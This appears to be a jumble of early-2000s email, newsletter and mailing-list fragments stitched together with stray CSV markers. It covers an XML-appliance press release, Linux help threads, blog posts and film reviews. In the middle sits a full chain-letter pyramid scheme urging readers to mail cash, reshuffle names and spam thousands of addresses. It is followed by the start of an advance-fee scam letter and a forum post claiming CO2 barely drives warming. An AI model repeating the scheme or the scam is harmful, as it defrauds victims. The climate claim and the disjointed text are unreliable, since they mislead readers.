 ""Today's firewalls are designed to inspect HTTP traffic only,"" Kelly 
 said. ""A SOAP packet with XML will go straight through a firewall. 
 Firewalls are blind to XML today.""
 
 Future products in DataPowers family will focus more specifically on 
 security, especially as Web services proliferate, Kelly said.
 
 According to DataPower, most existing solutions to offload XML 
 processing are homegrown and done in software -- an approach the company 
 itself tried initially and found to be inadequate with regards to speed 
 and security. After trying the software path, the company turned to 
 creating a solution that would process XML in hardware.
 
 ""Our XG3 execution core converts XML to machine code,"" said Kelly, 
 adding that to his knowledge no other company's solution does. Kelly 
 said in the next few months he expects the market to be flooded with 
 technologies that claim to do XML processing -- claims that he believes 
 will be mostly false.
 Other content-aware switches, such as SSL (secure socket layer) 
 accelerators and load balancers, look at the first 64 bytes of a packet, 
 while the XA35 provides deeper packet inspection, looking at 1,400 bytes 
 and thus enabling greater processing of XML data, Kelly explained.
 
 The 1U-high network device has been tested against a large collection of 
 XML and XSL data types and can learn new flavors of the markup language 
 as they pass through the device.
 
 The XA35 can be deployed in proxy mode behind a firewall and a load 
 balancer, and it will inspect all traffic that passes and will identify 
 and process those packets that are XML, Kelly said.
 
 In addition to proxy mode, the device can also be used as an application 
 co-processor. This deployment method gives administrators more granular 
 control over what data is inspected and the application server itself 
 controls the device.
 
 DataPower is not the only company chasing this emerging market. Startup 
 Sarvega, based in Burr Ridge, Ill., introduced the Sarvega XPE switch in 
 May, and earlier this month Tarari, an Intel spin-off, launched with a 
 focus on content processing and acceleration.
 The DataPower device is now available, priced starting at $54,995. The 
 company has announced one customer to date and says the product is in 
 field trails at a number of other enterprises.
 
 =========================================================================
 
 DataPower has been addressing enterprise networking needs since it was 
 founded in early 1999 by Eugene Kuznetsov, a technology visionary who 
 foresaw the adverse effects XML and other next generation protocols 
 would have on enterprise networks. Long before industry interest in XML 
 grew, Kuznetsov assembled a team of world-class M.I.T. engineers and 
 designed the industry's first solutions to address the unique 
 requirements for processing XML. The first such solution was a software 
 interpreter called DGXT. This software-based approach to XML processing 
 is still licensed by many companies for use in their own products today.
 
 Leveraging the detailed knowledge and customer experience gained from 
 developing software-based accelerators, Kuznetsov's team raised the bar 
 and designed a system for processing XML in purpose-built hardware. In 
 2001, DataPower's effort produced XML Generation Three (XG3), the 
 industry's fastest technology for XML processing, bar none.
 
 Today, XG3 technology powers the industry's first wire-speed XML 
 network devices, enabling secure, high-speed applications and XML Web 
 Services. While other companies are just now marketing first versions of 
 products, DataPower is delivering its third generation of technology, 
 providing an immediate return on technology investments to 
 industry-leading customers and partners.
 
 DataPower's M.I.T. heritage is complemented by a management team that 
 brings decades of experience in the networking and computing industries, 
 drawing veteran leaders from several successful companies including 
 Akamai, Argon, Cascade, Castle Networks, Sycamore and Wellfleet.

 networkingdevices, capable of transforming XML traffic and transactions 
 at the wire-speed enterprises need to effectively embrace Web services 
 and other XML-centric initiatives. DataPowers solutions are based on 
 its patent-pending XML Generation Three (XG3) technology.
 
 ""Enterprises are adopting XML at rapid rate to facilitate inter-and 
 intra-company communications but their network infrastructure is ill 
 prepared to support the requirements of this new traffic type. 
 DataPowers XML-acceleration devices enable the wirespeed processing of 
 XML that is required to support next generation enterprise 
 applications,"" said Eugene Kuznetsov, CTO and founder of DataPower 
 Technology.
 
 ""DataPower gives companies the ability to use XML thats critical to Web 
 services projects without sacrificing an ounce of performance."" A single 
 DataPower acceleration engine delivers the processing power of 10 
 serversbreaking the performance bottleneck associated with XML 
 processing and delivering an extraordinary return on investment. In 
 addition, the DataPower platform provides enhanced XML security, 
 protection against XML-based denial-of-service attacks, connection of 
 e-business protocols for incompatible XML data streams, load balancing 
 between back-end servers and real-time statistics reports.
 
 ""In the post-bubble economy, technology investment decisions require 
 laser-focused scrutiny. DataPowers patent-pending technology addresses 
 a very real and growing pain point for enterprises,"" said Michael 
 Tyrrell of Venrock Associates. ""By turbo-charging their networks with 
 DataPowers unique XML-Aware networking technology, companies will be 
 free to adopt next generation Web services without encountering 
 performance and security pitfalls.""
 
 ""We looked long and hard for a company capable of addressing the rapidly 
 growing problems surrounding XML message processing performance and 
 security,"" said Bill Burnham of Mobius Venture Capital. ""DataPower is on 
 their third generation of technology. Their patent pending XML 
 Generation Three (XG3)technology was quite simply the single most 
 compelling technology solution we have seen to date.""
 
 ""XML is not a nice-to-have, it is a must have for enterprises serious 
 about optimizing application efficiency. Since 1999, DataPower has been 
 developing solutions to facilitate enterprise use of XML and Web 
 services,"" said Jeff Fagnan of Seed Capital Partners. ""DataPowers 
 XML-acceleration devices are a key requirement for enterprises that rely 
 on XML for mission critical applications.""

 Ah....I think this may be a user error.  If you change the field in the 
 preferences window the variable doesn't actually change unless you press 
 return.  If you merely click elsewhere, nothing happens.

666,"Subject: 2000+ year old Greek computer reinterpreted
","URL: http://boingboing.net/#85507259
 Date: Not supplied
 
 The Antikythera mechanism, recovered off a sunken ship in Greece in 1900, is 
 thought to be a clockwork device to calculate the orbits of the celestial 
 bodies. New analysis of the remaining fragments shows that it was wicked-cool: 
 
     The Greeks believed in an earth-centric universe and accounted for 
     celestial bodies' motions using elaborate models based on epicycles, in 
     which each body describes a circle (the epicycle) around a point that 
     itself moves in a circle around the earth. Mr Wright found evidence that 
     the Antikythera mechanism would have been able to reproduce the motions of 
     the sun and moon accurately, using an epicyclic model devised by 
     Hipparchus, and of the planets Mercury and Venus, using an epicyclic model 
     derived by Apollonius of Perga. (These models, which predate the mechanism, 
     were subsequently incorporated into the work of Claudius Ptolemy in the 
     second century AD.) 
 
     A device that just modelled the motions of the sun, moon, Mercury and Venus 
     does not make much sense. But if an upper layer of mechanism had been 
     built, and lost, these extra gears could have modelled the motions of the 
     three other planets known at the timeMars, Jupiter and Saturn. In other 
     words, the device may have been able to predict the positions of the known 
     celestial bodies for any given date with a respectable degree of accuracy, 
     using bronze pointers on a circular dial with the constellations of the 
     zodiac running round its edge.

667,"Subject: [ILUG] Samba login question
","I have a situation with a small network as follows:
 
 A number of client workstations which are running VMware, each of which will
 run a local copy of Samba (not the VMware autoinstalled version) to let
 VMware access local linux disks.
 
 An NIS/NFS server which will also run Samba to allow the VMware clients
 access to its filesystems.
 
 How can I set things up so that all the VMware clients (all running 'doze
 98, possibly being upgraded in future to W2K) authenticate against the NIS
 server's Samba ? I have read the Samab documentation in  large quantities
 down through the years but as I've never wanted to do anything like this, I
 never paid much attention to all the stuff about domain controllers etc.
 which I presume is what I will need to have running here.
 
 I would also like, if at all possible, to have synchronisation of passwords
 between the NIS domain and the NIS server's Samba with minimal manual
 intervention.
 
 Ideas, accompanied by annotated Samba configration files :-) , gratefully
 received.

670,"Subject: Labels shoot selves in foot by focusing on stopping P2P
","URL: http://boingboing.net/#85490404
 Date: Not supplied
 
 A new KPMG study concludes that the RIAA and its member companies are hurting 
 themselves by focusing on cracking down on P2P sharing instead of figuring out 
 ways to earn a living with it. 
 
     Media companies must put less emphasis on protecting digital content and 
     instead find ways to make money from digital music and movies if they hope 
     to beat back copyright pirates who threaten their businesses, according to 
     a study released on Wednesday from KPMG... 
 
     ""They complain about the Napsters,"" she said, referring to the bankrupt 
     music swap site that was found to violate U.S. copyright laws. ""But why do 
     the Napsters exist, because the marketplace wants them."" 
 
     Steel said that if the issue ""is not on boardroom table ... then that 
     boardroom has problems.""

 Im using the standard ADSL package

 Anyway
 I have a dedicated linux server running debian 3.0 with the ADSL modem
 plugged directly into it.
 I have a 5 port switch connecting the home net, all have their own 10/100 nic.
 The server runs my firewall/net gateway/etc.
 And I have some firewall rules for masquerading 
 which shares the connection over the lan just nicely.
 
 Once the machine is configured for adsl  (thats the tough bit)
 the network stuff is quite easy.
 
 I found that to be the simpelst way to go.

 <font size=""+1""><b>IT sees new profits in Old Glory</b></a></font><br>
 
 
 
 
 Can CRM be tweaked to track terrorists? As the fight against <b>terrorism</b> heats up, the government turns to the tech industry to come up with tools to secure the country against attack. It's an opportunity for patriotism--and for profits. (Nearly $38 billion is slated for homeland security.) <b>Software companies</b>  are sending tens of thousands of proposals to government agencies, some of which are so new they don't have the budget to hire people to evaluate them all.

 <font size=""+1""><b>Are Spam blocklists going too far?</b></a></font><br>
 
 Many businesses are turning to spam-filtering tools to regain
 control of their e-mail boxes. But legitimate e-mails are being 
 deleted, too, now that <b>sometimes-indiscriminate blacklists</b> have
 become a key weapon in the war against unsolicited bulk e-mail.
  Companies
 subscribe to the lists, bouncing any traffic directed to their
 servers that originates from those addresses. Is <b>overkill</b> the
 answer to stopping spam? What is your company doing to stop
 junk e-mail?

 All things considered, I get that effect with Mailman, but the viable

 something called SmartList which is a bitch to set up.

 Maybe I'm the only one confused but what you are saying is that you
 have a spamtrap that receives Bugtraq messages and you are auto-
 matically reporting them as SPAM only to revoke them shortly there-
 after???  Either way automatic reporting is a Bad Thing (tm) IMHO.
 You should review and then report spamtrap or otherwise.  I'm not
 sure how this would affect your rating because I don't have any docs
 nor code to look at but I sincerely hope that if that's what you
 are doing that it negatively impacts your rating at a near exponential
 rate with every report/revoke cycle.

 Brent confessed recently that he had tried to subvert the X
 model(s) of copy and paste.  Not in those words... but that
 was how I read it. ;)
 
 I have a lot of trouble copying and pasting from or to exmh 
 across a VNC link (from things in the vncviewer to things not in 
 it and vice versa).  As long as I stick to apps being ""normally"" 
 displayed on my X server I don't have much of a problem.
 
 My recollection from my X programming days is that the X model,
 like everything in X, is more complex than the human brain can
 handle.  It also is very different from the MS-Windows model.
 And I get the feeling that Tk tries to ""unify"" those two models
 and fails.  Not sure what the exmh-specific contribution to the 
 confusion is, frankly.

 Steve sez: ""It's tragic when life imitates Wile E. Coyote cartoons. Guy 
 boobytraps his house to get his family if they try to break in, and seemingly 
 is killed himself by his own traps."" Link[1] Discuss[2] (_Thanks, Steve[3]!_)

 Well, in sylheed's ""claws"" branch you need to wait a bit for the developers
 to backport all the updates from the main branch before getting a release
 with the same version number.
 
 Right now, the latest ""claws"" release is still 0.8.2claws :
 http://sourceforge.net/project/showfiles.php?group_id=25528
 
 But as it's the primary mailer I use, you can be sure that as soon as it's
 updated to 0.8.3, I'll update my build! :-)

 You're a bit too vague on your ""[rpm package]"" here...

 You can just put the name, of the name and version, and even the release,

 There are a number of reasons to think that CO2 is not important to
 controlling global temperature and that much of the CO2 increase may not
 be anthropogenic. Some recent research points worth mentioning:
 
 Recent high-resolution studies of historical CO2 concentrations and
 temperatures over hundreds of thousands of years have shown a modest
 correlation between the two. In a number of cases, CO2 level increases
 are not in phase with temperature increases and actually trail the
 increase in temperature by a short time i.e. increases in temperature
 preceded increases in CO2 concentrations. The more studies that are done
 of the geological record, the more it seems that CO2 concentrations are
 correlated with temperature increases, but are not significantly
 causative. There is a lot of evidence that CO2 levels are regulated in a
 fairly stable fashion.  I don't believe anyone really has an
 authoritative answer as to exactly how this works yet.
 
 With respect to absolute CO2 concentrations, it is also important to
 point out that our best data to date suggests that they follow a fairly
 regular cycle with a period of about 100,000 years.  At previous cycle
 peaks, the concentrations were similar to what they are now.  If this
 cycle has any validity (and we only have good data for 4-5 complete
 cyclical periods, but which look surprisingly regular in shape and
 time), then we should be almost exactly at a peak right now.  As it
 happens, current CO2 concentrations are within 10% of other previous
 cyclical concentration peaks for which we have good data. In other
 words, we may be adding to the CO2 levels, but it looks a lot like we
 would be building a molehill on top of a mountain in the historical
 record.  At the very least, there is nothing anomalous about current CO2
 concentrations.
 
 Also, CO2 levels interact with the biosphere in a manner that ultimately
 affects temperature.  Again, the interaction is not entirely
 predictable, but this is believed to be one of the regulating negative
 feedback systems mentioned above.
 
 Last, as greenhouse gases go, CO2 isn't particularly potent, although it
 makes up for it in volume in some cases.  Gases such as water and
 methane have a far greater impact as greenhouse gases on a per molecule
 basis.  Water vapor may actually be the key greenhouse gas, something
 that CO2 only indirectly effects through its interaction with the
 biosphere.
 
 CO2 was an easy mark for early environmentalism, but all the recent
 studies and data I've seen gives me the impression that it is largely a
 passenger on the climate ride rather than the driver.  I certainly don't
 think it is a healthy fixation if we're actually interested in
 understanding warming trends.
 
 Cheers,

 Are you running Gnome 1.4? I had similar problems as did several
 co-workers. Updating my Gnome components has fixed it for me and
 others, although I can't say exactly which component did the
 trick. Gnomecore or gtk would seem most likely, but it may have been
 something else.
 
 In any case, I have not seen the problem for quite a while, now.

 SO WHAT DOES ALL THIS MEAN TO YOU?
 
 Let's assume that every person has 'only' one E-mail address.
 That's 500 million potential customers and growing! In addition,
 
        ""E-mail is without question the most powerful
         method of distributing information on earth""
 
 Well, I think you get the picture. The numbers and potential are
 just staggering, but it gets even better ...
 
 START YOUR OWN E-MAIL BUSINESS TODAY & ENJOY
 THE FOLLOWING BENEFITS:
 *********************************************************
 1. ALL CUSTOMERS PAY YOU IN CASH
 2. YOU WILL SELL A PRODUCT WHICH COSTS NOTHING TO PRODUCE
 3. YOUR ONLY MAJOR OVERHEAD IS YOUR TIME
 4. YOU HAVE 100s OF MILLIONS OF POTENTIAL CUSTOMERS
 5. YOU GET DETAILED, EASY TO FOLLOW STARTUP INSTRUCTIONS
 ********************************************************
   
 AND THIS IS JUST THE TIP OF THE ICEBERG ...
 As you read on you'll discover how a 'Seen on National TV'
 program is paying out excellent returns, every 4 to 5 months
 from your home, for a minimal initial startup investment of
 only $25 US Dollars. ALL THANKS TO THE COMPUTER AGE
 AND THE INTERNET!
 
 This is the letter you have been hearing a lot about recently.
 Due to the popularity of this letter on the Internet, a national
 weekly news program recently devoted an entire show to the
 investigation of this program described below, to see if it really
 can make people money.
 
 This is what one had to say: '' Thanks to this profitable 
 opportunity. I was approached many times before but each time 
 I passed on it.  I am so glad I finally joined just to see what 
 one could expect in return for the minimal effort and money 
 required.  To my astonishment, I received a 6 figure income 
 in 21 weeks, with money still coming in''.
 Pam Hedland, Fort Lee, New Jersey.
 
 =====================================================================
 Here is another testimonial: '' this program has been around for 
 a long time but I never believed in it.  But one day when I received 
 this again in the mail I decided to gamble my $25 on it.  I followed 
 the simple instructions and walaa ..... 3 weeks later the money 
 started to come in.  First month I only made a small amount of money,  
 but the next 2 months after that I made a total of a good 6 figures.  
 So far, in the past 8 months by re-entering the program, I have made 
 a lot more and I am playing it again.  The key to success in this 
 program is to follow the simple steps and NOT change anything.''  
 
 =====================================================================
 More testimonials later but first:
 
 *****PRINT THIS NOW FOR YOUR FUTURE REFERENCE & FOLLOW THESE
 SIMPLE INSTRUCTIONS TO MAKE YOUR FINANCIAL DREAMS TRUE! *****
 
 INSTRUCTIONS:
 ============
 **** Order all 5 reports shown on the list below.
 
 **** For each report, send $5 U.S. CASH, THE NAME & NUMBER
 OF THE REPORT YOU ARE ORDERING and YOUR E-MAIL ADDRESS to
 the person whose name appears ON THAT LIST next to the report.
 
   MAKE SURE YOUR RETURN ADDRESS IS ON YOUR ENVELOPE
   TOP LEFT CORNER in case of any mail problems.
 
   **** When you place your order, make sure
        you order each of the 5 reports ****
 
 You will need all 5 reports so that you can save them on your
 computer and resell them.
 
 YOUR UP-FRONT COST is ONLY $5 X 5 = $25.00.
 
 *********Within a few days you will receive, via e-mail, each
 of the 5 reports from these 5 different individuals. Save
 them on your computer so they will be accessible for you to
 send to the 1,000's of people who may order from you.
 Also make a floppy of these reports and keep it at your desk
 in case something happens to your computer.
 
 **********IMPORTANT - DO NOT alter the names of the people
 who are listed next to each report, or their sequence on the
 list, in any way other than what is instructed below in steps
 1 through 6 or you will loose out on majority of your profits.
 Once you understand the way this works, you will also see how
 it does not work if you change it.
 
 Remember, this method has been tested, and if you alter,
 it will NOT work! People have tried to put their friends/relatives
 names on all five thinking they could get all the money. But it
 does not work this way. Believe us, we all have tried to be greedy
 and then nothing happened.
 
 So do not try to change anything other than what is instructed.
 Because if you do, it will not work for you.  Remember,
 honesty reaps the reward!!!
 
 1. After you have ordered all 5 reports, take this
 advertisement and REMOVE the name & address of the person in
 REPORT # 5. This person has made it through the cycle and is
 no doubt counting their money.
 
 2. Move the name & address in REPORT # 4 down TO REPORT # 5.
 3. Move the name & address in REPORT # 3 down TO REPORT # 4.
 4. Move the name & address in REPORT # 2 down TO REPORT # 3.
 5. Move the name & address in REPORT # 1 down TO REPORT # 2.
 6. Insert YOUR name & address in the REPORT # 1 Position.
 
 PLEASE MAKE SURE you copy every name & address ACCURATELY!
 =========================================================
 
 Take this entire letter, with the modified list of names,
 and save it on your computer. DO NOT MAKE ANY OTHER CHANGES.
 Save this on a disk as well just in case if you loose any
 data.
 
 To assist you with marketing your business on the Internet,
 the 5 reports you purchase will provide you with invaluable
 marketing information that includes: How to send bulk e-mails
 legally, Where to find thousands of free classified ads and
 much, much more.
 
 There are 2 Primary methods to get this venture going:
 
   METHOD # 1: SENDING BULK E-MAIL LEGALLY
   =======================================
 Let's say that you decide to start small, just to see how
 it goes, and we will assume you and those involved send out
 only 5,000 e-mails each.  Let's also assume that the mailing
 receive only a 0.2% response (the response could be much
 better but lets just say it is only 0.2%. Also, many people
 may send out hundreds of thousands e-mails instead of only
 5,000 each).
 
 Continuing with this example, you send out only 5,000 e-mails.
 With a 0.2% response, that is only 10 orders for report #1.
 Those 10 people responded by sending out 5,000 e-mail each
 for a total of 50,000.  Out of those 50,000 e-mails only 0.2%
 responded with orders.  That's = 100 people responded and
 ordered Report #2. Those 100 people mail out 5,000 e-mails
 each for a total of 500,000 e-mails.  The 0.2% response to
 that is 1000 orders for Report #3.
 
 Those 1000 people send out 5,000 e-mails each for a total of
 5 million e-mails sent out.  The 0.2% response to that is
 10,000 orders for Report #4.  Those 10,000 people send out
 5,000 e-mails each for a total of 50,000,000 (50 million)
 Emails.  The 0.2% response to that is 100,000 orders for
 Report #5.
 
 THAT'S 100,000 ORDERS TIMES $5 EACH = $500,000.00 (a half
 million).
 
   Your total income in this example is:
   1..... $50 +
   2..... $500 +
   3..... $5,000 +
   4..... $50,000 +
   5..... $500,000 ......... Grand Total = $555,550.00
 
   NUMBERS DO NOT LIE.  GET A PENCIL & PAPER AND FIGURE OUT
   THE WORST POSSIBLE RESPONSES AND NO MATTER HOW YOU
   CALCULATE IT, YOU CAN STILL MAKE MONEY!
 -----------------------------------------------------------
   REMEMBER FRIEND, THIS IS ASSUMING ONLY 10 PEOPLE
   ORDERING OUT OF 5,000 PEOPLE YOU MAILED.
 
 Dare to think for a moment what would happen if everyone,
 or 1/2, or even one 1/5 of those people mailed 100,000 e-mails
 each or more?  There are over 500 million people on the
 Internet worldwide and counting.  Believe me, many people
 may do just that, and more!
 
   METHOD # 2: PLACING FREE ADS ON THE INTERNET
   ===================================================
 Advertising on the net is very, very inexpensive and there
 are hundreds of FREE places to advertise.  Placing a lot of
 free ads on the Internet can easily get a larger response.
 We strongly suggest you start with Method # 1 and add METHOD
 # 2 as you go along.
 
 For every $5 you receive, all you must do is e-mail them the
 Report they ordered.  That's it!  Always provide same day
 service on all orders. This will guarantee that the emails
 they send out, with your name and address on it, will be
 prompt because they can not advertise until they receive the
 report.
 
   ORDER EACH REPORT BY ITS NUMBER & NAME ONLY.
 
 Note:  Always send $5 cash (U.S. CURRENCY) for each Report.
 Checks or money orders are NOT accepted.  Make sure the cash
 is wrapped in at least 2 sheets of paper before you put it in
 the envelope. On one of those sheets of paper, write the NUMBER
 and the NAME of the Report you are ordering, your email ADDRESS,
 your NAME and postal address. Make sure you affix proper
 'International' Postage if ordering a report from outside your
 country.

   $$$$$$$$$ YOUR SUCCESS GUIDELINES $$$$$$$$$$$
 
 Follow these guidelines to guarantee your success:
 *************************************************
 If you do not receive at least 10 orders for Report #1 within
 2 weeks, continue sending e-mails until you do.
 
 After you have received 10 orders, 2 to 3 weeks after that
 you should receive 100 orders or more for Report #2.  If you
 did not, continue advertising or sending e-mails until you do.
 
 Once you have received 100 or more orders for Report #2, YOU
 CAN RELAX, because the system is already working for you!

 E-MAILS AND START THE WHOLE PROCESS AGAIN!!!
   ____________________________________________________
 
   FOLLOWING IS A NOTE FROM THE ORIGINATOR OF THIS PROGRAM:
 
 Follow the program EXACTLY AS INSTRUCTED. Do not change it
 in any way.  It works exceedingly well as it is now.
 Remember to e-mail a copy of this exciting report after you
 have put your name and address in Report #1 and moved others
 to #2...........# 5 as instructed above.  One of the people
 you send this to may send out 100,000 or more e-mails and your
 name will be on every one of them.  Remember though, the more
 you send out the more potential customers you will reach.
 
 So my friend, I have given you the ideas, information,
 materials and opportunity .... IT IS UP TO YOU NOW!

 '' My name is Mitchell.  My wife, Jody and I live in Chicago.  
 I am an accountant with a major U.S. Corporation and I make 
 pretty good money.  When I received this program I grumbled 
 to Jody about receiving ''junk mail''.  I made fun of the 
 whole thing, spouting my knowledge of the population and 
 percentages involved.  I ''knew'' it wouldn't work.  Jody 
 totally ignored my supposed intelligence and few days later 
 she jumped in with both feet.  I made merciless fun of her, 
 and was ready to lay the old ''I told you so'' on her when 
 the thing didn't work.  Well, the laugh was on me!  Within 
 3 weeks she had received 50 responses within the next 45 days 
 she had so many orders and ... all cash! I was shocked.  I
 have joined Jody in her ''hobby''.

 '' Not being the gambling type, it took me several weeks to make 
 up my mind to participate in this plan.  But conservative that 
 I am, I decided that the initial investment was so little that 
 there was just no way that I wouldn't get enough orders to at 
 least get my money back''.  '' I was surprised when I found my 
 medium size post office box crammed with orders.  I made a large 
 6 figure income in the first 12 weeks.  The nice thing about this 
 deal is that it does not matter where people live.  There simply 
 isn't a better investment with a faster return and so big''.
 Dan
 Sondstrom, Alberta,
 Canada
 ================================================================
 
 '' I had received this program before.  I deleted it, but later 
 I wondered if I should have given it a try.  Of course, I had no 
 idea who to contact to get another copy, so I had to wait until 
 I was e-mailed again by someone else ........ 11 months passed 
 then it luckily came again ...... I did not delete this one! I 
 made a six figure income on my first try and all the money came
 within 22 weeks''. 
 Susan De Suza, New York, N.Y.
 ================================================================
 
 '' It really is a great opportunity to make relatively easy money 
 with little cost to you.  I followed the simple instructions 
 carefully and within 10 days the money started to come in.  My 
 first month I made a substantial income and by the end of the

 Pg 177:
 In another country, a local newspaper, intrigued by our evidence of
 extralegal real estate holdings, checked to see if the head of state's
 official residence had a recorded title.  It did not.
 
 Pg 92:
 The value of land in the formal sector of Lima averages US$50 per square
 meter, whereas in the area of Gamarra, where a great deal of Peru's
 informal manufacturing sector resides, the value per square meter can go
 as high as US$3,000.
 
 ==========
 
 I'd have made the same assumption you did.  De Soto says that isn't
 correct.  You can find mansions that don't have title.  A lot of them,
 in fact.  But they can't be used for collateral for a loan, or otherwise
 participate as 'capital' because of their extra-legal status.

 French historian Fernand Braudel (so Braudel's Bell Jar, not De Soto's)
 
 ==>
 
 The key problem is to find out why that sector of society of the past,
 which I would not hesitate to call capitalist, should have lived as if
 in a bell jar, cut off from the rest; why was it not able to expand and
 conquer the whole of society? ... [Why was it that] a significant rate
 of capital formation was possible only in certain sectors and not in the
 whole market economy of the time? ... It would perhaps be teasingly
 paradoxial to say that whatever was in short supply, money certainly was
 not ... so this was an age where poor land was bought up and magnificent
 country residents built ... [How do we] resolve the contradiction ...
 between the depressed economic climate and the splendors of Florence
 under Lorenzo the Magnificent?
  
 
 --------------
 
 De Soto's theory is that the Bell Jar is formed when you segregate those
 who have *practical* access to legal property rights and those who do
 not.  The poor[1] have property -- lots and lots of property.  What they
 don't have is access to the systems where we turn property into capital
 and allow it to start growing.  Their property can only be exchanged
 with a small section of people who know them personally.

 FWIW, I use Eudora under Winder$ because it's less of a virus magnet.  :)
 
 There's more to the story why I run Winder$, but that's really off-topic and I'm already guilty!

  Try installing the latest Perl (at least 5.6.1) port on Freebsd and make
 sure you set the system to use perl from ports (i.e. in the
 ports/lang/perl5/files directory run ./use.perl port. Reinstall the relevant
 perl modules needed by razor and try again.

 Due to the current war against white farmers in
 Zimbabwe and the support of President Robert Mugabe to
 Claim all white owned farms in our country to gain

 All white farmers were asked to
 Surrender their farms to the government for
 Re-distribution and infact to his political party

 Opposition party that did not support the president

 After the death of my father, our local pastor and a

 That doesn't matter.  What does matter
 is that they were going on phenotypes,
 and didn't engineer the genetics.  That
 example makes a good case for natural
 selection, but not for artificial.
 
 (do ""married people live longer"" because
 of the benefits of matrimony, or because
 acceptable health is one of the qualities
 selected for in spouses?)
 
 Of course, if there are FoRKs with six
 or fewer biological great grandparents
 (or who are offspring of Wilt) I should
 eat my words; otherwise, the micro/macro
 distinction seems much more relevant.

 One can also view that argument as a case
 for checks: livestock owners have, over a
 period of millenia, altered the genetics
 of their herds to be dumber, meatier, and
 more tolerant of industrial living, so if
 caution is in order, they are some of the
 least likely people to volunteer it.

 This is of course belated, as I'm sending it on the 18th, but Happy Birthday to Lori!
 <p>
 One thing about MacWorld should excite mp3 junkies -- the iPod just got 
 even bigger, with a 20GB version and Apple officially endorses Windows 
 compatibility. Actually, the good news is, the 5GB and 10GB versions 
 came down in price. Hearing that the only ""officially"" functional 
 Windows player is MusicMatch Jukebox Plus is a serious downer, in my 
 opinion. Sure, MusicMatch is a decent player, but with plenty of great 
 free players on the market, why do we want to purchase a software 
 player in addition to the $299+ hardware unit?
 <p>
 At first glance, it looks like Apple is only paying lipservice to true 
 Windows compatibility. I've seen no mention of any additional 
 functionality, besides song management via one media playing utility. Mediafour's 
 <a href=""http://www.mediafour.com/products/xplay/"">XPlay</a> remains a 
 better option, in my opinion. In addition to allowing you to use an 
 iPod with almost any media player made for Windows, it assists with 
 contact management, via Outlook vCards, in addition to making the 
 iPod an additional drive on your PC. At a mere $10 more than MusicMatch 
 Jukebox Plus, XPlay blows the doors off Apple's officially endorsed player.
 <p>
 Lori and I made the five and a half hour drive to St. Louis for this year's 
 <a href=""http://www.sic.org"">SIC</a> without a hitch. I just missed a 
 face-to-face introduction to John Lal, of 
 <a href=""http://www.winferno.com"">winferno.com</a>, although I'm sure 
 we'll meet tomorrow. John's the guy behind the 
 <a href=""http://www.winferno.com/p/lg4/"">free copy of Research-Desk</a> 
 for all Gnomedex attendees. Shortly after arrival, I enjoyed dinner with 
 the <a href=""http://www.esellerate.net"">eSellerate</a> gang, with a 
 discussion about <a href=""http://www.gnometomes.com"">GnomeTomes</a> and 
 what the future holds.
 <p>
 Every time I travel, I'm reminded just how slow dialup really is. Fortunately, my 
 <a href=""http://www.crosspaths.net"">Crosspaths.net</a> connection allows me 
 to send mail via my Lockergnome account, unlike most of the national dialup 
 services. Crosspaths is technically an Iowa ISP, although the have points of 
 presence in almost every major city in the country. If you're a dialup user, 
 you may want to take a look at their offerings, regardless of where you live. Lori 
 has used their DSL service for two years now, and they've been nothing short of 
 outstanding in dealing with customer service queries.

 This originally appeared in last weeks Webmaster Weekly, but due to its graphical nature, its worth inclusion here as well:
 <p>
 ""If you browse to a Web page that contains an image that has a transparent 
 background in Portable Network Graphics (PNG) format, the image background 
 may appear to be gray rather than transparent.""
 
 Fortunately, Microsoft explains a solution for this problem. Personally, I 
 haven't encountered this PNG display error, but for those of you 
 simplementing PNGs on your sites, you'll want to review the solution.

 Unknown artists across a variety of genres offer free mp3 downloads of 
 selected tracks, with an option to purchase songs on CD for the price 
 of shipping and handling. All CDs are professionally mastered works, 
 so you're getting label quality releases, without the jacked-up retail 
 price tag. The mp3s let you decide if the album is worth you $4.95. 
 The only thing I find odd about this site is their proclamation of 
 paying artists 50% of distribution profits, which I have to assume is 
 50% of zero, since the CDs are free. The artist selection contains 
 some solid releases by talented artists, regardless.

 <b>Who's Afraid of Virginia Woolf?</b> (NR) 1966<br>
 Adapted Play - 131min<br>

 Before directing Catch-22 and The Graduate, Mike Nichols made his big screen debut directing this adroit adaptation of Edward Albee's play ""Who's afraid of Virginia Woolf?""  Nominated for thirteen, and winner of five, Academy Awards, this dark tale centers on history professor George (Richard Burton), and his wife Martha (Elizabeth Taylor), daughter of the college president.  At first George and Martha appear to be the average Ozzie and Harriet, an aging, well-adjusted, educated couple, comfortable with their lives and their love.  George and Martha quickly shatter this illusion, as they return from a faculty cocktail party, to exchange a caustic barrage of verbal barbs.  Just as quickly, however, the couple turns witty and civil when the young new biology professor Nick (George Segal) and his shy, but pretty wife Honey (Sandy Dennis) stop by for a nightcap. Unfortunately for Nick and Honey, the sardonic exchange does not disappear, it merely changed guise.  Soon Nick and Honey find themselves helpless pawns in the elder couple's sick-witted exchange.  Throughout the remainder of the movie, George and Martha dance their finely choreographed, oft-rehearsed dance of despise. The two alternate the lead, alternately dishing out and enabling the abuse, but they never miss a step.  Thankfully, writer Albee's sublime play translates to the big screen almost unadulterated. Taylor and Burton deliver his lines with great force and impeccable timing.  At one point George proposes ""Now that we're through with Humiliate the Host...and we don't want to play Hump the Hostess yet...how about a little round of Get the Guests?""  This provides some idea of the precarious twist of uncomfortable wit that drives the action from start to finish. Albee's stellar writing notwithstanding, the real star of this film is Taylor and Burton's alchemy, converting Albee's words into cinematic gold.  Ok, I will grant you that playing a pair of aging, drunk, selfish lovers may not have been much of a stretch.  Both actors, however, deliver their lines with the chilling reality of a serial killer describing his most gratifying slaying.  Often unpleasant and disturbing, this film never allows you to relax or look away.   Simultaneously seamlessly smooth, and ingeniously rocky this is not a ""feel good"" movie. ""Who's Afraid of Virginia Woolf?"" is, however, a memorable film that will stick with you for years to come.

","http://www.washingtonpost.com/wp-dyn/articles/A63543-2002Sep10.html
 
 ""MIAMI, Sept. 10 -- A two-gram rock of crack
 cocaine was found inside the shoe of Florida
 Gov. Jeb Bush's 25-year-old daughter by workers
 at the central Florida rehabilitation center
 where she is undergoing court-ordered drug
 treatment, Orlando police said today.
 
 Noelle Bush was not arrested because witnesses
 would not give sworn statements, but the
 incident is under investigation, according to
 Orlando police spokesman Orlando Rolon.""
 
 Wow, the witnesses would not nark of a Bush girl in an era where there are
 no mare restrictions on being held without a cause?
 
 Imagine that...

 They want to preserve binary compatibility for all .x releases. Red Hat

 Dear Fool,
 
 Just before Enron plunged...
 
 ...16 of 17 Wall Street analysts were still urging you 
 to buy Enron's stock.  While the company piled up debt 
